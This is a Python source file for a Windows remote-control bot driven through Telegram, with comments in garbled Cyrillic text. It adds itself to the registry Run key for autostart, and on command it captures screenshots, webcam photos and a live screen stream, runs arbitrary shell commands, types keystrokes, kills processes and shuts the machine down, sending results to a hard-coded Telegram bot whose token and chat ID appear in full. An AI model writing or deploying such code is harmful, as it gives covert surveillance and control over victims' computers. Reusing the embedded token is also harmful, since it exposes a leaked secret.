import telebot
import pyautogui
import cv2
import os
import sys
import winreg
import time
import threading
import numpy as np
import psutil
import subprocess
import ctypes
import keyboard
import pygetwindow as gw
from PIL import Image

# –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è (–ó–ê–ú–ï–ù–ò–¢–ï –ù–ê –°–í–û–ò –î–ê–ù–ù–´–ï)
BOT_TOKEN = "7911812987:AAHpm_K4N2DKRBKkDaNOCMkXCcY1MIINwgc"
CHAT_ID = "855423845"  # –í–∞—à ID –≤ Telegram
# --------------------------------------

bot = telebot.TeleBot(BOT_TOKEN)
streaming = False
last_stream_message_id = None
stream_quality = 25
stream_interval = 1

# ====================== –û–°–ù–û–í–ù–´–ï –§–£–ù–ö–¶–ò–ò ====================== #

def add_to_autostart():
    """–î–æ–±–∞–≤–ª–µ–Ω–∏–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É Windows"""
    try:
        app_path = os.path.abspath(sys.argv[0])
        key_name = "RemoteControlBot"
        
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        ) as key:
            winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, f'"{sys.executable}" "{app_path}"')
        return True
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏: {e}")
        return False

# ... (—Ñ—É–Ω–∫—Ü–∏–∏ take_screenshot –∏ take_webcam_photo –æ—Å—Ç–∞—é—Ç—Å—è –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π) ...

# ====================== –ù–û–í–´–ô –§–£–ù–ö–¶–ò–û–ù–ê–õ ====================== #

def take_screenshot(quality=100):
    """–°–æ–∑–¥–∞–Ω–∏–µ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞ —ç–∫—Ä–∞–Ω–∞ —Å –Ω–∞—Å—Ç—Ä–æ–π–∫–æ–π –∫–∞—á–µ—Å—Ç–≤–∞"""
    try:
        screenshot = pyautogui.screenshot()
        screenshot_path = os.path.join(os.getenv('TEMP'), 'screenshot.jpg')
        
        # –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ–º –≤ RGB, –µ—Å–ª–∏ –Ω—É–∂–Ω–æ
        if screenshot.mode != 'RGB':
            screenshot = screenshot.convert('RGB')
            
        # –°–æ—Ö—Ä–∞–Ω—è–µ–º —Å —É–∫–∞–∑–∞–Ω–Ω—ã–º –∫–∞—á–µ—Å—Ç–≤–æ–º
        screenshot.save(screenshot_path, 'JPEG', quality=quality)
        return screenshot_path
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞: {e}")
        return None

def take_webcam_photo():
    """–°–æ–∑–¥–∞–Ω–∏–µ —Å–Ω–∏–º–∫–∞ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã"""
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return None
            
        ret, frame = cap.read()
        cap.release()
        
        if ret:
            photo_path = os.path.join(os.getenv('TEMP'), 'webcam.jpg')
            cv2.imwrite(photo_path, frame)
            return photo_path
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –∫–∞–º–µ—Ä—ã: {e}")
    return None

def get_system_info():
    """–ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Å–∏—Å—Ç–µ–º–µ"""
    try:
        # –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–µ
        cpu_percent = psutil.cpu_percent(interval=1)
        cpu_freq = psutil.cpu_freq().current if psutil.cpu_freq() else "N/A"
        cpu_cores = psutil.cpu_count(logical=False)
        cpu_threads = psutil.cpu_count(logical=True)
        
        # –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–∞–º—è—Ç–∏
        mem = psutil.virtual_memory()
        mem_total = mem.total // (1024**3)
        mem_used = mem.used // (1024**3)
        mem_percent = mem.percent
        
        # –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –¥–∏—Å–∫–µ
        disk = psutil.disk_usage('/')
        disk_total = disk.total // (1024**3)
        disk_used = disk.used // (1024**3)
        disk_percent = disk.percent
        
        # –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–µ—Ç–∏
        net = psutil.net_io_counters()
        net_sent = net.bytes_sent // (1024**2)
        net_recv = net.bytes_recv // (1024**2)
        
        # –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–∏—Å—Ç–µ–º–µ
        boot_time = psutil.boot_time()
        uptime = time.time() - boot_time
        hours, remainder = divmod(uptime, 3600)
        minutes, seconds = divmod(remainder, 60)
        
        info = (
            f"üíª <b>–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–∏—Å—Ç–µ–º–µ</b>\n\n"
            f"<b>–ü—Ä–æ—Ü–µ—Å—Å–æ—Ä:</b>\n"
            f"‚Ä¢ –ó–∞–≥—Ä—É–∑–∫–∞: {cpu_percent}%\n"
            f"‚Ä¢ –ß–∞—Å—Ç–æ—Ç–∞: {cpu_freq} –ú–ì—Ü\n"
            f"‚Ä¢ –Ø–¥—Ä–∞: {cpu_cores} —Ñ–∏–∑–∏—á–µ—Å–∫–∏—Ö, {cpu_threads} –ª–æ–≥–∏—á–µ—Å–∫–∏—Ö\n\n"
            f"<b>–ü–∞–º—è—Ç—å:</b>\n"
            f"‚Ä¢ –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–æ: {mem_used} –ì–ë –∏–∑ {mem_total} –ì–ë ({mem_percent}%)\n\n"
            f"<b>–î–∏—Å–∫ (C:):</b>\n"
            f"‚Ä¢ –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–æ: {disk_used} –ì–ë –∏–∑ {disk_total} –ì–ë ({disk_percent}%)\n\n"
            f"<b>–°–µ—Ç—å:</b>\n"
            f"‚Ä¢ –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ: {net_sent} –ú–ë\n"
            f"‚Ä¢ –ü–æ–ª—É—á–µ–Ω–æ: {net_recv} –ú–ë\n\n"
            f"<b>–í—Ä–µ–º—è —Ä–∞–±–æ—Ç—ã:</b>\n"
            f"‚Ä¢ {int(hours)} —á. {int(minutes)} –º–∏–Ω. {int(seconds)} —Å–µ–∫."
        )
        return info
    except Exception as e:
        return f"‚ùå –û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏: {str(e)}"

def list_processes():
    """–°–ø–∏—Å–æ–∫ –∑–∞–ø—É—â–µ–Ω–Ω—ã—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤"""
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'memory_percent']):
            try:
                processes.append(proc.info)
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
        
        # –°–æ—Ä—Ç–∏—Ä—É–µ–º –ø–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—é –ø–∞–º—è—Ç–∏
        processes = sorted(processes, key=lambda p: p['memory_percent'], reverse=True)[:15]
        
        result = "üîÑ <b>–¢–æ–ø-15 –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ –ø–æ –ø–∞–º—è—Ç–∏:</b>\n\n"
        for i, proc in enumerate(processes):
            result += f"{i+1}. {proc['name']} (PID: {proc['pid']}) - {proc['memory_percent']:.1f}%\n"
        
        return result
    except Exception as e:
        return f"‚ùå –û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–æ–≤: {str(e)}"

def kill_process(pid):
    """–ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–∞ –ø–æ PID"""
    try:
        pid = int(pid)
        process = psutil.Process(pid)
        process.terminate()
        return f"‚úÖ –ü—Ä–æ—Ü–µ—Å—Å {pid} ({process.name()}) –∑–∞–≤–µ—Ä—à–µ–Ω"
    except (ValueError, psutil.NoSuchProcess, psutil.AccessDenied) as e:
        return f"‚ùå –û—à–∏–±–∫–∞: {str(e)}"

def get_active_window():
    """–ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ–± –∞–∫—Ç–∏–≤–Ω–æ–º –æ–∫–Ω–µ"""
    try:
        window = gw.getActiveWindow()
        if window:
            return f"üñ•Ô∏è <b>–ê–∫—Ç–∏–≤–Ω–æ–µ –æ–∫–Ω–æ:</b>\n\n{window.title}"
        return "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å –∞–∫—Ç–∏–≤–Ω–æ–µ –æ–∫–Ω–æ"
    except Exception as e:
        return f"‚ùå –û—à–∏–±–∫–∞: {str(e)}"

def lock_workstation():
    """–ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä–∞"""
    try:
        ctypes.windll.user32.LockWorkStation()
        return "üîí –ö–æ–º–ø—å—é—Ç–µ—Ä –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω"
    except Exception as e:
        return f"‚ùå –û—à–∏–±–∫–∞ –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏: {str(e)}"

def shutdown_computer(delay=30):
    """–í—ã–∫–ª—é—á–µ–Ω–∏–µ –∫–æ–º–ø—å—é—Ç–µ—Ä–∞"""
    try:
        os.system(f"shutdown /s /t {delay}")
        return f"‚è≥ –ö–æ–º–ø—å—é—Ç–µ—Ä –≤—ã–∫–ª—é—á–∏—Ç—Å—è —á–µ—Ä–µ–∑ {delay} —Å–µ–∫—É–Ω–¥"
    except Exception as e:
        return f"‚ùå –û—à–∏–±–∫–∞ –≤—ã–∫–ª—é—á–µ–Ω–∏—è: {str(e)}"

def cancel_shutdown():
    """–û—Ç–º–µ–Ω–∞ –≤—ã–∫–ª—é—á–µ–Ω–∏—è –∫–æ–º–ø—å—é—Ç–µ—Ä–∞"""
    try:
        os.system("shutdown /a")
        return "‚úÖ –í—ã–∫–ª—é—á–µ–Ω–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ"
    except Exception as e:
        return f"‚ùå –û—à–∏–±–∫–∞ –æ—Ç–º–µ–Ω—ã –≤—ã–∫–ª—é—á–µ–Ω–∏—è: {str(e)}"

def execute_command(cmd):
    """–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã –≤ CMD"""
    try:
        result = subprocess.check_output(
            cmd, 
            shell=True, 
            stderr=subprocess.STDOUT, 
            text=True,
            timeout=10
        )
        return f"‚úÖ –†–µ–∑—É–ª—å—Ç–∞—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è:\n<code>{result[:3000]}</code>" if result else "‚úÖ –ö–æ–º–∞–Ω–¥–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞"
    except subprocess.CalledProcessError as e:
        return f"‚ùå –û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è:\n<code>{e.output[:3000]}</code>"
    except Exception as e:
        return f"‚ùå –û—à–∏–±–∫–∞: {str(e)}"

def send_keys(keys):
    """–û—Ç–ø—Ä–∞–≤–∫–∞ –∫–ª–∞–≤–∏—à –Ω–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä"""
    try:
        keyboard.write(keys)
        return f"‚å®Ô∏è –û—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –∫–ª–∞–≤–∏—à–∏: {keys}"
    except Exception as e:
        return f"‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–ª–∞–≤–∏—à: {str(e)}"

def screen_stream(chat_id):
    """–ü–æ—Ç–æ–∫ –¥–ª—è —Ç—Ä–∞–Ω—Å–ª—è—Ü–∏–∏ —ç–∫—Ä–∞–Ω–∞ —Å –∑–∞–º–µ–Ω–æ–π –ø—Ä–µ–¥—ã–¥—É—â–µ–≥–æ –∫–∞–¥—Ä–∞"""
    global streaming, stream_quality, stream_interval, last_stream_message_id
    
    frame_count = 0
    last_update = time.time()
    
    while streaming:
        try:
            start_time = time.time()
            
            # –°–æ–∑–¥–∞–µ–º —Å–∫—Ä–∏–Ω—à–æ—Ç
            screenshot = pyautogui.screenshot()
            frame = np.array(screenshot)
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
            
            # –†–µ—Å–∞–π–∑ –∏ –æ–ø—Ç–∏–º–∏–∑–∞—Ü–∏—è
            height, width = frame.shape[:2]
            new_width = int(width * stream_quality / 100)
            new_height = int(height * stream_quality / 100)
            small_frame = cv2.resize(frame, (new_width, new_height))
            
            # –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–π —Ñ–∞–π–ª
            stream_path = os.path.join(os.getenv('TEMP'), 'stream.jpg')
            cv2.imwrite(stream_path, small_frame, [int(cv2.IMWRITE_JPEG_QUALITY), 85])
            
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º/–æ–±–Ω–æ–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
            with open(stream_path, 'rb') as photo:
                if frame_count == 0:
                    # –ü–µ—Ä–≤—ã–π –∫–∞–¥—Ä - —Ä–µ–¥–∞–∫—Ç–∏—Ä—É–µ–º –Ω–∞—á–∞–ª—å–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
                    bot.edit_message_media(
                        chat_id=chat_id,
                        message_id=last_stream_message_id,
                        media=telebot.types.InputMediaPhoto(photo),
                        reply_markup=None
                    )
                    bot.edit_message_caption(
                        chat_id=chat_id,
                        message_id=last_stream_message_id,
                        caption="üü¢ –°—Ç—Ä–∏–º –∑–∞–ø—É—â–µ–Ω | –ö–∞—á–µ—Å—Ç–≤–æ: {}% | –ò–Ω—Ç–µ—Ä–≤–∞–ª: {}—Å".format(
                            stream_quality, stream_interval
                        )
                    )
                else:
                    # –ü–æ—Å–ª–µ–¥—É—é—â–∏–µ –∫–∞–¥—Ä—ã - —Ä–µ–¥–∞–∫—Ç–∏—Ä—É–µ–º —Å—É—â–µ—Å—Ç–≤—É—é—â–µ–µ
                    try:
                        bot.edit_message_media(
                            chat_id=chat_id,
                            message_id=last_stream_message_id,
                            media=telebot.types.InputMediaPhoto(photo)
                        )
                    except telebot.apihelper.ApiTelegramException as e:
                        if "message is not modified" in str(e):
                            pass  # –ò–≥–Ω–æ—Ä–∏—Ä—É–µ–º –µ—Å–ª–∏ –∫–æ–Ω—Ç–µ–Ω—Ç –Ω–µ –∏–∑–º–µ–Ω–∏–ª—Å—è
                        else:
                            raise
            
            # –£–¥–∞–ª—è–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–π —Ñ–∞–π–ª
            os.remove(stream_path)
            
            # –û–±–Ω–æ–≤–ª—è–µ–º —Å—Ç–∞—Ç—É—Å –∫–∞–∂–¥—ã–µ 10 —Å–µ–∫—É–Ω–¥
            if time.time() - last_update > 10:
                fps = frame_count / 10
                bot.edit_message_caption(
                    chat_id=chat_id,
                    message_id=last_stream_message_id,
                    caption="üü¢ –°—Ç—Ä–∏–º | FPS: {:.1f} | –ö–∞—á–µ—Å—Ç–≤–æ: {}% | –ò–Ω—Ç–µ—Ä–≤–∞–ª: {}—Å".format(
                        fps, stream_quality, stream_interval
                    )
                )
                frame_count = 0
                last_update = time.time()
            
            frame_count += 1
            
            # –í—ã–¥–µ—Ä–∂–∏–≤–∞–µ–º –∏–Ω—Ç–µ—Ä–≤–∞–ª
            elapsed = time.time() - start_time
            sleep_time = max(0.1, stream_interval - elapsed)
            time.sleep(sleep_time)
            
        except Exception as e:
            print(f"–û—à–∏–±–∫–∞ —Å—Ç—Ä–∏–º–∞: {e}")
            time.sleep(1)
    
    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ñ–∏–Ω–∞–ª—å–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
    bot.edit_message_caption(
        chat_id=chat_id,
        message_id=last_stream_message_id,
        caption="üî¥ –°—Ç—Ä–∏–º –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω"
    )

# ====================== –û–ë–†–ê–ë–û–¢–ß–ò–ö–ò –ö–û–ú–ê–ù–î ====================== #

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if str(message.chat.id) != CHAT_ID:
        return
    help_text = """
üìü <b>–ö–æ–º–∞–Ω–¥—ã —É–¥–∞–ª—ë–Ω–Ω–æ–≥–æ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è:</b>

üñºÔ∏è <b>–ú–µ–¥–∏–∞:</b>
/screen - —Å–∫—Ä–∏–Ω—à–æ—Ç —ç–∫—Ä–∞–Ω–∞
/webcam - —Ñ–æ—Ç–æ —Å –∫–∞–º–µ—Ä—ã
/stream_start - –Ω–∞—á–∞—Ç—å —Ç—Ä–∞–Ω—Å–ª—è—Ü–∏—é —ç–∫—Ä–∞–Ω–∞
/stream_stop - –æ—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Ç—Ä–∞–Ω—Å–ª—è—Ü–∏—é
/stream_quality [1-100] - –∫–∞—á–µ—Å—Ç–≤–æ —Å—Ç—Ä–∏–º–∞
/stream_interval [—Å–µ–∫—É–Ω–¥—ã] - –∏–Ω—Ç–µ—Ä–≤–∞–ª –∫–∞–¥—Ä–æ–≤

üíª <b>–°–∏—Å—Ç–µ–º–∞:</b>
/sysinfo - –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–∏—Å—Ç–µ–º–µ
/processes - —Å–ø–∏—Å–æ–∫ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤
/kill [PID] - –∑–∞–≤–µ—Ä—à–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å
/window - –∞–∫—Ç–∏–≤–Ω–æ–µ –æ–∫–Ω–æ
/lock - –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –∫–æ–º–ø—å—é—Ç–µ—Ä
/shutdown [—Å–µ–∫—É–Ω–¥—ã] - –≤—ã–∫–ª—é—á–∏—Ç—å –∫–æ–º–ø—å—é—Ç–µ—Ä
/cancel_shutdown - –æ—Ç–º–µ–Ω–∏—Ç—å –≤—ã–∫–ª—é—á–µ–Ω–∏–µ

‚öôÔ∏è <b>–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ:</b>
/cmd [–∫–æ–º–∞–Ω–¥–∞] - –≤—ã–ø–æ–ª–Ω–∏—Ç—å –∫–æ–º–∞–Ω–¥—É CMD
/keys [—Ç–µ–∫—Å—Ç] - –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–ª–∞–≤–∏—à–∏
/press [–∫–ª–∞–≤–∏—à–∞] - –Ω–∞–∂–∞—Ç—å –∫–ª–∞–≤–∏—à—É (–Ω–∞–ø—Ä–∏–º–µ—Ä: alt+f4)
"""
    bot.reply_to(message, help_text, parse_mode='HTML')

@bot.message_handler(commands=['sysinfo'])
def send_system_info(message):
    if str(message.chat.id) != CHAT_ID:
        return
    info = get_system_info()
    bot.reply_to(message, info, parse_mode='HTML')

@bot.message_handler(commands=['processes'])
def send_process_list(message):
    if str(message.chat.id) != CHAT_ID:
        return
    processes = list_processes()
    bot.reply_to(message, processes, parse_mode='HTML')

@bot.message_handler(commands=['kill'])
def kill_selected_process(message):
    if str(message.chat.id) != CHAT_ID:
        return
        
    try:
        pid = message.text.split()[1]
        result = kill_process(pid)
        bot.reply_to(message, result, parse_mode='HTML')
    except IndexError:
        bot.reply_to(message, "‚ùå –£–∫–∞–∂–∏—Ç–µ PID –ø—Ä–æ—Ü–µ—Å—Å–∞: /kill [PID]")

@bot.message_handler(commands=['window'])
def send_active_window(message):
    if str(message.chat.id) != CHAT_ID:
        return
    window_info = get_active_window()
    bot.reply_to(message, window_info, parse_mode='HTML')

@bot.message_handler(commands=['lock'])
def lock_system(message):
    if str(message.chat.id) != CHAT_ID:
        return
    result = lock_workstation()
    bot.reply_to(message, result)

@bot.message_handler(commands=['shutdown'])
def shutdown_system(message):
    if str(message.chat.id) != CHAT_ID:
        return
        
    try:
        delay = int(message.text.split()[1]) if len(message.text.split()) > 1 else 30
        result = shutdown_computer(delay)
        bot.reply_to(message, result)
    except ValueError:
        bot.reply_to(message, "‚ùå –£–∫–∞–∂–∏—Ç–µ –≤—Ä–µ–º—è –≤ —Å–µ–∫—É–Ω–¥–∞—Ö: /shutdown [—Å–µ–∫—É–Ω–¥—ã]")

@bot.message_handler(commands=['cancel_shutdown'])
def cancel_system_shutdown(message):
    if str(message.chat.id) != CHAT_ID:
        return
    result = cancel_shutdown()
    bot.reply_to(message, result)

@bot.message_handler(commands=['cmd'])
def execute_system_command(message):
    if str(message.chat.id) != CHAT_ID:
        return
        
    try:
        command = message.text[5:]
        if not command:
            bot.reply_to(message, "‚ùå –£–∫–∞–∂–∏—Ç–µ –∫–æ–º–∞–Ω–¥—É: /cmd [–∫–æ–º–∞–Ω–¥–∞]")
            return
            
        result = execute_command(command)
        bot.reply_to(message, result, parse_mode='HTML')
    except Exception as e:
        bot.reply_to(message, f"‚ùå –û—à–∏–±–∫–∞: {str(e)}")

@bot.message_handler(commands=['keys'])
def send_keyboard_keys(message):
    if str(message.chat.id) != CHAT_ID:
        return
        
    try:
        keys = message.text[6:]
        if not keys:
            bot.reply_to(message, "‚ùå –£–∫–∞–∂–∏—Ç–µ —Ç–µ–∫—Å—Ç: /keys [—Ç–µ–∫—Å—Ç]")
            return
            
        result = send_keys(keys)
        bot.reply_to(message, result)
    except Exception as e:
        bot.reply_to(message, f"‚ùå –û—à–∏–±–∫–∞: {str(e)}")

@bot.message_handler(commands=['press'])
def press_special_key(message):
    if str(message.chat.id) != CHAT_ID:
        return
        
    try:
        key = message.text[7:]
        if not key:
            bot.reply_to(message, "‚ùå –£–∫–∞–∂–∏—Ç–µ –∫–ª–∞–≤–∏—à—É: /press [–∫–ª–∞–≤–∏—à–∞]")
            return
            
        keyboard.press_and_release(key)
        bot.reply_to(message, f"‚úÖ –ù–∞–∂–∞—Ç–∞ –∫–ª–∞–≤–∏—à–∞: {key}")
    except Exception as e:
        bot.reply_to(message, f"‚ùå –û—à–∏–±–∫–∞: {str(e)}")

@bot.message_handler(commands=['screen'])
def send_screenshot(message):
    if str(message.chat.id) != CHAT_ID:
        return
        
    bot.reply_to(message, "üì∏ –î–µ–ª–∞—é —Å–∫—Ä–∏–Ω—à–æ—Ç...")
    screenshot_path = take_screenshot()
    
    if screenshot_path and os.path.exists(screenshot_path):
        with open(screenshot_path, 'rb') as photo:
            bot.send_photo(message.chat.id, photo)
        os.remove(screenshot_path)
    else:
        bot.reply_to(message, "‚ùå –û—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è —Å–∫—Ä–∏–Ω—à–æ—Ç–∞")

@bot.message_handler(commands=['webcam'])
def send_webcam_photo(message):
    if str(message.chat.id) != CHAT_ID:
        return
        
    bot.reply_to(message, "üì∑ –§–æ—Ç–æ–≥—Ä–∞—Ñ–∏—Ä—É—é...")
    photo_path = take_webcam_photo()
    
    if photo_path and os.path.exists(photo_path):
        with open(photo_path, 'rb') as photo:
            bot.send_photo(message.chat.id, photo)
        os.remove(photo_path)
    else:
        bot.reply_to(message, "‚ùå –û—à–∏–±–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–∞–º–µ—Ä–µ")

@bot.message_handler(commands=['stream_start'])
def start_stream(message):
    global streaming, last_stream_message_id
    
    if str(message.chat.id) != CHAT_ID:
        return
        
    if streaming:
        bot.reply_to(message, "‚ÑπÔ∏è –°—Ç—Ä–∏–º —É–∂–µ –∑–∞–ø—É—â–µ–Ω")
        return
        
    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –Ω–∞—á–∞–ª—å–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –∏ –∑–∞–ø–æ–º–∏–Ω–∞–µ–º –µ–≥–æ ID
    status_msg = bot.reply_to(message, "üü° –ó–∞–ø—É—Å–∫–∞—é —Å—Ç—Ä–∏–º —ç–∫—Ä–∞–Ω–∞...")
    last_stream_message_id = status_msg.message_id
    
    streaming = True
    stream_thread = threading.Thread(target=screen_stream, args=(message.chat.id,))
    stream_thread.daemon = True
    stream_thread.start()

@bot.message_handler(commands=['stream_stop'])
def stop_stream(message):
    global streaming
    
    if str(message.chat.id) != CHAT_ID:
        return
        
    if streaming:
        streaming = False
        bot.reply_to(message, "üõë –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—é —Å—Ç—Ä–∏–º...")
    else:
        bot.reply_to(message, "‚ÑπÔ∏è –°—Ç—Ä–∏–º –Ω–µ –∞–∫—Ç–∏–≤–µ–Ω")

@bot.message_handler(commands=['stream_quality'])
def set_stream_quality(message):
    global stream_quality
    
    if str(message.chat.id) != CHAT_ID:
        return
        
    try:
        quality = int(message.text.split()[1])
        if 1 <= quality <= 100:
            stream_quality = quality
            bot.reply_to(message, f"‚úÖ –ö–∞—á–µ—Å—Ç–≤–æ —Å—Ç—Ä–∏–º–∞ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ: {quality}%")
        else:
            bot.reply_to(message, "‚ùå –£–∫–∞–∂–∏—Ç–µ –∫–∞—á–µ—Å—Ç–≤–æ –æ—Ç 1 –¥–æ 100")
    except:
        bot.reply_to(message, "‚ùå –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: /stream_quality [1-100]")

@bot.message_handler(commands=['stream_interval'])
def set_stream_interval(message):
    global stream_interval
    
    if str(message.chat.id) != CHAT_ID:
        return
        
    try:
        interval = float(message.text.split()[1])
        if 0.3 <= interval <= 10:
            stream_interval = interval
            bot.reply_to(message, f"‚úÖ –ò–Ω—Ç–µ—Ä–≤–∞–ª —Å—Ç—Ä–∏–º–∞ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω: {interval} —Å–µ–∫—É–Ω–¥")
        else:
            bot.reply_to(message, "‚ùå –£–∫–∞–∂–∏—Ç–µ –∏–Ω—Ç–µ—Ä–≤–∞–ª –æ—Ç 0.3 –¥–æ 10 —Å–µ–∫—É–Ω–¥")
    except:
        bot.reply_to(message, "‚ùå –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: /stream_interval [—Å–µ–∫—É–Ω–¥—ã]")

@bot.message_handler(commands=['lock'])
def lock_pc(message):
    if str(message.chat.id) != CHAT_ID:
        return
    # –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä–∞
    bot.reply_to(message, "–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–æ")
    os.system('rundll32.exe user32.dll,LockWorkStation')

def run_bot():
    """–ó–∞–ø—É—Å–∫ –±–æ—Ç–∞ —Å –æ–±—Ä–∞–±–æ—Ç–∫–æ–π –æ—à–∏–±–æ–∫"""
    while True:
        try:
            bot.polling(none_stop=True, timeout=30)
        except Exception as e:
            print(f"–û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è: {e}")
            time.sleep(10)

# ====================== –ó–ê–ü–£–°–ö –ü–†–û–ì–†–ê–ú–ú–´ ====================== #

if __name__ == "__main__":
    # –î–æ–±–∞–≤–ª–µ–Ω–∏–µ –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É –ø—Ä–∏ –ø–µ—Ä–≤–æ–º –∑–∞–ø—É—Å–∫–µ
    if not getattr(sys, 'frozen', False):
        add_to_autostart()
    
    # –ó–∞–ø—É—Å–∫ –±–æ—Ç–∞ –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    # –ë–µ—Å–∫–æ–Ω–µ—á–Ω—ã–π —Ü–∏–∫–ª –¥–ª—è —Ä–∞–±–æ—Ç—ã –ø—Ä–æ–≥—Ä–∞–º–º—ã
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        streaming = False
        sys.exit()